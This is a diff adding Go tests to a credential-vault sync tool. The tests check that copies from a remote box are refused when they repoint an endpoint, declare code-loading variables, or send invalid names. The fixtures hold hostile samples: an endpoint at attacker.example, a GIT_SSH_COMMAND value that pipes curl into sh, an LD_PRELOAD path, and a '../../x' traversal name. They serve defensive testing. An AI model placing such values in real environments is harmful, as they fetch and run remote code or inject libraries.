@@ -360,6 +360,118 @@ func TestUnansweredEntriesFail(t *testing.T) {
 	}
 }
 
+// A copy is whole: one missing a value for a secret it declares is refused,
+// so a box cannot keep a local secret under an endpoint of its choosing.
+func TestCopyMissingASecretIsRefused(t *testing.T) {
+	local := newVault(t)
+	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
+	repointed := bundle()
+	repointed.Vars[0].Value = "https://attacker.example"
+	session := liar(t, response{Entries: []Credential{{Entry: repointed}}})
+
+	results, err := session.Pull(local, []string{"cdp-es"}, true)
+	if err != nil || len(results) != 1 || results[0].Outcome != Failed {
+		t.Errorf("pull = %+v, %v; want one failure", results, err)
+	}
+	if e, _ := local.Get("cdp-es"); e.Vars[0].Value != "https://logs.internal" {
+		t.Errorf("the endpoint was repointed to %s", e.Vars[0].Value)
+	}
+}
+
+// A copied entry may not declare a variable that makes programs load code: a
+// box could otherwise turn a credential into code run by the next exec here,
+// and this machine could do the same to a box.
+func TestCopiesRefuseCodeLoadingVariables(t *testing.T) {
+	planted := vault.Entry{Name: "stripe", Vars: []vault.Var{
+		{Name: "STRIPE_KEY", Secret: true},
+		{Name: "GIT_SSH_COMMAND", Value: "sh -c 'curl evil | sh'"},
+	}}
+	local := newVault(t)
+	session := liar(t, response{Entries: []Credential{
+		{Entry: planted, Values: map[string][]byte{"STRIPE_KEY": []byte("sk")}},
+	}})
+	pulled, err := session.Pull(local, []string{"stripe"}, false)
+	if err != nil || len(pulled) != 1 || pulled[0].Outcome != Failed {
+		t.Errorf("pull = %+v, %v; want one failure", pulled, err)
+	}
+	if _, ok := local.Get("stripe"); ok {
+		t.Error("an entry declaring GIT_SSH_COMMAND was stored")
+	}
+
+	sender, box := newVault(t), newVault(t)
+	put(t, sender, vault.Entry{Name: "lib", Vars: []vault.Var{{Name: "LD_PRELOAD", Value: "/tmp/x.so"}}}, nil)
+	pushed, err := connectToBox(t, box).Push(sender, []string{"lib"}, false)
+	if err != nil || len(pushed) != 1 || pushed[0].Outcome != Failed {
+		t.Errorf("push = %+v, %v; want one failure", pushed, err)
+	}
+	if _, ok := box.Get("lib"); ok {
+		t.Error("an entry declaring LD_PRELOAD was stored on the box")
+	}
+}
+
+// Values travel as bytes: one that is not valid UTF-8 arrives intact, and two
+// that differ only there compare as different.
+func TestValuesTravelAsBytes(t *testing.T) {
+	const raw = "pass\xff\xfeword"
+	latin := vault.Entry{Name: "latin", Vars: []vault.Var{{Name: "PW", Secret: true}}}
+	local, box := newVault(t), newVault(t)
+	put(t, local, latin, map[string]string{"PW": raw})
+	session := connectToBox(t, box)
+
+	if _, err := session.Push(local, []string{"latin"}, false); err != nil {
+		t.Fatal(err)
+	}
+	if got, err := box.UnsealVar("latin", "PW"); err != nil || got != raw {
+		t.Errorf("the box holds %q, %v; want %q", got, err, raw)
+	}
+
+	put(t, local, latin, map[string]string{"PW": "pw\xe4"})
+	put(t, box, latin, map[string]string{"PW": "pw\xe5"})
+	if states, err := session.Status(local); err != nil || states["latin"] != Differs {
+		t.Errorf("status = %v, %v; want latin to differ", states, err)
+	}
+}
+
+// What a box reports is checked: an entry name no vault would accept, or an
+// outcome that is not one of the five, is refused.
+func TestBoxReportsAreValidated(t *testing.T) {
+	local := newVault(t)
+	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
+
+	if _, err := liar(t, response{Digests: []entryDigest{{Name: "../../x"}}}).Status(local); err == nil {
+		t.Error("a status naming ../../x was accepted")
+	}
+	session := liar(t, response{Results: []Result{{Name: "cdp-es", Outcome: "pwned"}}})
+	if _, err := session.Push(local, []string{"cdp-es"}, false); err == nil {
+		t.Error("an outcome that is not one of the five was accepted")
+	}
+}
+
+// The box audits every entry it was sent, stored or not: a refused push
+// still handed it the values.
+func TestBoxAuditsEveryReceivedEntry(t *testing.T) {
+	local, box := newVault(t), newVault(t)
+	put(t, local, bundle(), map[string]string{"ES_API_KEY": apiKey, "ES_TOKEN": apiToken})
+	put(t, box, bundle(), map[string]string{"ES_API_KEY": "other", "ES_TOKEN": apiToken})
+	session, _, log := connectTo(t, box)
+
+	if results, err := session.Push(local, []string{"cdp-es"}, false); err != nil || results[0].Outcome != Conflict {
+		t.Fatalf("push = %+v, %v; want a conflict", results, err)
+	}
+	log.mu.Lock()
+	defer log.mu.Unlock()
+	if len(log.events) != 1 || log.events[0].Entry != "cdp-es" || log.events[0].Outcome != Conflict {
+		t.Errorf("box audit = %+v, want the refused push", log.events)
+	}
+}
+
+// connectToBox is connectTo when only the session matters.
+func connectToBox(t *testing.T, box *vault.Vault) *Session {
+	t.Helper()
+	session, _, _ := connectTo(t, box)
+	return session
+}
+
 // A box cannot make this side buffer without end: an oversized frame ends the
 // session.
 func TestChannelRefusesOversizedFrames(t *testing.T) {
